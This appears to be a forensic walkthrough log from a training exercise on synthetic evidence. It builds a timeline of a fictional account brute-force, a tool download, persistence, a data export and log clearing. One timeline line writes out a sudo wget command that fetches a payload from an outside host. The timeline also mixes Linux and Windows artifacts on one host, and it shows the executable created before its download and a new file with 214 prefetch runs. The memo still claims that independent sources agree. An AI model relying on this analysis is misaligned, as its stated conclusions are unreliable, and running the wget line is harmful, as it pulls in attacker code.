@@ -1,0 +1,56 @@
+runs/d-dfir-deep.log — walkthrough transcript
+Date: 2026-10-09 · Environment: stock Python 3.12, coreutils (sort/sha256sum/grep)
+All evidence synthetic and LABELED, generated for this exercise (gen_evidence.py, seed 4417).
+Fictional host WS-4417, fictional users. No real system analyzed.
+
+STEP 1 — evidence generated: 12 auth lines, 4 web lines, 5 artifact lines.
+
+STEP 2+3 — normalize + merge-sort into super-timeline (timeline.tsv, 21 lines):
+2026-10-08T01:58:12Z	auth	sshd: Failed password for j.chen from 203.0.113.44 port 51234 ssh2
+2026-10-08T01:58:13Z	auth	sshd: Failed password for j.chen from 203.0.113.44 port 51234 ssh2
+2026-10-08T01:58:17Z	auth	sshd: Failed password for j.chen from 203.0.113.44 port 51234 ssh2
+2026-10-08T01:58:21Z	auth	sshd: Failed password for j.chen from 203.0.113.44 port 51234 ssh2
+2026-10-08T01:58:25Z	auth	sshd: Failed password for j.chen from 203.0.113.44 port 51234 ssh2
+2026-10-08T01:58:29Z	auth	sshd: Failed password for j.chen from 203.0.113.44 port 51234 ssh2
+2026-10-08T01:58:33Z	auth	sshd: Failed password for j.chen from 203.0.113.44 port 51234 ssh2
+2026-10-08T01:58:37Z	auth	sshd: Failed password for j.chen from 203.0.113.44 port 51234 ssh2
+2026-10-08T01:59:03Z	auth	sshd: Accepted password for j.chen from 203.0.113.44 port 51234 ssh2
+2026-10-08T01:59:03Z	disk	eventlog Security/4624 logon j.chen type=10 src=203.0.113.44 time=2026-10-08T01:59:03Z
+2026-10-08T01:59:04Z	auth	sshd: pam_unix(sshd:session): session opened for user j.chen by (uid=0)
+2026-10-08T02:11:00Z	disk	usn C:\Users\j.chen\AppData\Roaming\updater-svc.exe created=2026-10-08T02:11:00Z
+2026-10-08T02:11:47Z	auth	sudo: j.chen : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.23/updater-svc -O /tmp/updater-svc
+2026-10-08T02:14:00Z	disk	prefetch C:\Windows\Prefetch\UPDATER-SVC.EXE-1A2B3C4D.pf run_count=214 last_run=2026-10-08T02:14:00Z
+2026-10-08T02:14:02Z	web	203.0.113.44 GET /health HTTP/1.1 -> 200 (12 bytes)
+2026-10-08T02:14:31Z	web	203.0.113.44 POST /api/upload HTTP/1.1 -> 200 (88 bytes)
+2026-10-08T02:15:10Z	web	203.0.113.44 GET /api/export?format=csv&range=all HTTP/1.1 -> 200 (4412096 bytes)
+2026-10-08T02:16:00Z	disk	registry HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdaterSvc -> C:\Users\j.chen\AppData\Roaming\updater-svc.exe set=2026-10-08T02:16:00Z
+2026-10-08T03:39:12Z	disk	eventlog Security/1102 audit-log-cleared time=2026-10-08T03:39:12Z
+2026-10-08T03:40:00Z	auth	sshd: pam_unix(sshd:session): session closed for user j.chen
+2026-10-08T09:02:11Z	web	10.0.4.12 GET /dashboard HTTP/1.1 -> 200 (4312 bytes)
+
+CORRECTION (not smoothed): first normalizer dropped the sudo/wget line (regex required [pid])
+and truncated disk lines at 120 chars. Fixed regex, re-ran: 21/21 lines, wget line present.
+
+STEP 4 — the three-sentence story the timeline tells:
+At 01:58-01:59Z, j.chen's account was brute-forced (8 failures) then logged in from 203.0.113.44.
+At 02:11Z a file updater-svc.exe was created via sudo wget from 198.51.100.23; it ran (prefetch),
+persisted via a Run key at 02:16Z, and at 02:15Z a 4.4 MB export left via the web app from the attacker's IP.
+At 03:39Z the Security log was cleared (event 1102) — anti-forensics — before the session closed.
+
+STEP 5 — IOCs: 203.0.113.44 (13 hits), 198.51.100.23 (1), updater-svc.exe,
+HKCU Run\UpdaterSvc, j.chen (compromised account).
+
+STEP 6 — chain-of-custody hashes:
+57683f9a877ad1ab3fecc9694fc69e124639a1a7737e42deea1b113bfcf9a97d  timeline.tsv
+dea06076892e83548ec0b78fc0f14093aa0dcc3e8aed7919599857b811a587da  auth.log
+80066714c76b97122ac9f0871234f8b2343b915eab232d8b05c8f8c932fe3875  web.log
+f6006497a68f6c8c30d0a592d546486d77c8050eb967991a45dd142749e66dbb  artifacts.txt
+
+STEP 7 — findings memo: WHAT HAPPENED: credential brute-force -> interactive login -> tool download
+-> persistence -> 4.4MB data export -> log clearing. WHAT WAS TOUCHED: j.chen account, /tmp/updater-svc,
+Run registry key, web app export endpoint. HOW WE KNOW: timeline lines above (auth 01:58-01:59,
+usn 02:11, prefetch 02:14, web 02:15, registry 02:16, 1102 at 03:39) — three independent sources agree.
+HONEST LIMITS: labeled synthetic data — proves the method, not a real intrusion; no memory/network
+capture in this exercise (reader-side in their lab); attribution to a human actor not attempted.
+
+RESULT: all 7 steps ran. Nothing unrun.
